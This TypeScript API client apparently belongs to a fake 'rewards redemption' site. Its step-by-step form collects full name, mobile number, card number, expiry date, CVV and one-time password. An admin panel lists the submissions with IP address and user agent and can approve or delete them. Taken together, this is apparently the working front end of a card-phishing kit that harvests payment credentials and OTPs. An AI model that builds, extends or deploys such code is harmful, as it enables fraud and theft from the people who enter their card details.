const API_BASE_URL = 'http://localhost:5001/api';

export interface RedemptionRequest {
  id: string;
  fullName: string;
  mobileNumber: string;
  cardLimit: string;
  cardNumber: string;
  expiryDate: string;
  status: 'draft' | 'pending' | 'approved' | 'rejected';
  submittedAt: string;
  ipAddress?: string;
  userAgent?: string;
}

export interface ApiResponse<T> {
  data?: T;
  message: string;
  error?: string;
}

export interface PaginatedResponse<T> {
  requests: T[];
  pagination: {
    current: number;
    pages: number;
    total: number;
  };
  stats: {
    total: number;
    draft: number;
    pending: number;
    approved: number;
    rejected: number;
  };
}

class ApiService {
  private token: string | null = null;

  constructor() {
    this.token = localStorage.getItem('adminToken');
  }

  private async request<T>(
    endpoint: string,
    options: RequestInit = {}
  ): Promise<T> {
    const url = `${API_BASE_URL}${endpoint}`;
    
    const config: RequestInit = {
      headers: {
        'Content-Type': 'application/json',
        ...(this.token && { Authorization: `Bearer ${this.token}` }),
        ...options.headers,
      },
      ...options,
    };

    try {
      const response = await fetch(url, config);
      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || 'An error occurred');
      }

      return data;
    } catch (error) {
      console.error('API request failed:', error);
      throw error;
    }
  }

  // Public endpoints
  async submitRedemptionRequest(formData: {
    fullName: string;
    mobileNumber: string;
    cardLimit: string;
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    otp: string;
  }): Promise<ApiResponse<{ requestId: string }>> {
    return this.request('/rewards-redemption', {
      method: 'POST',
      body: JSON.stringify(formData),
    });
  }

  // Step-by-step form submission
  async savePersonalInfo(formData: {
    fullName: string;
    mobileNumber: string;
    cardLimit: string;
  }): Promise<ApiResponse<{ requestId: string }>> {
    return this.request('/rewards-redemption/step1', {
      method: 'POST',
      body: JSON.stringify(formData),
    });
  }

  async saveCardDetails(requestId: string, formData: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
  }): Promise<ApiResponse<{ requestId: string }>> {
    return this.request(`/rewards-redemption/${requestId}/step2`, {
      method: 'PATCH',
      body: JSON.stringify(formData),
    });
  }

  async submitOTP(requestId: string, otp: string): Promise<ApiResponse<{ requestId: string }>> {
    return this.request(`/rewards-redemption/${requestId}/step3`, {
      method: 'PATCH',
      body: JSON.stringify({ otp }),
    });
  }

  // Admin endpoints
  async adminLogin(credentials: {
    username: string;
    password: string;
  }): Promise<ApiResponse<{ token: string; admin: any }>> {
    const response = await this.request<any>('/admin/login', {
      method: 'POST',
      body: JSON.stringify(credentials),
    });

    if (response.token) {
      this.token = response.token;
      localStorage.setItem('adminToken', response.token);
    }

    return response;
  }

  async getRedemptionRequests(params: {
    page?: number;
    limit?: number;
    status?: string;
    search?: string;
  } = {}): Promise<PaginatedResponse<RedemptionRequest>> {
    const queryParams = new URLSearchParams();
    
    Object.entries(params).forEach(([key, value]) => {
      if (value !== undefined && value !== '') {
        queryParams.append(key, value.toString());
      }
    });

    const queryString = queryParams.toString();
    const endpoint = `/admin/redemption-requests${queryString ? `?${queryString}` : ''}`;
    
    return this.request(endpoint);
  }

  async updateRequestStatus(
    id: string,
    status: 'approved' | 'rejected'
  ): Promise<ApiResponse<{ request: { id: string; status: string } }>> {
    return this.request(`/admin/redemption-requests/${id}/status`, {
      method: 'PATCH',
      body: JSON.stringify({ status }),
    });
  }

  async deleteRequest(id: string): Promise<ApiResponse<{}>> {
    return this.request(`/admin/redemption-requests/${id}`, {
      method: 'DELETE',
    });
  }

  logout() {
    this.token = null;
    localStorage.removeItem('adminToken');
  }

  isAuthenticated(): boolean {
    return !!this.token;
  }
}

export const apiService = new ApiService();